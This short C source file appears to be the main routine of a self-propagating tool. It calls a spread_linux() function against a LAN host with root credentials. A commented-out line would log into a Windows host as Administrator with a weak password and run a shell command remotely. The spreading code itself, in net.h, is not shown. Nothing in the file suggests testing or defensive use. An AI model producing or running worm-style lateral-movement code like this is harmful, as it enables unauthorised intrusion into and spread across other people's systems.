#include "net.h"

int main() {
    // establish_connection("192.168.1.21", "Administrator", "Password123!", "cmd /c dir", get_os_type("192.168.1.21"));
    spread_linux("192.168.1.32", "root", "password123");
    return 0;
}
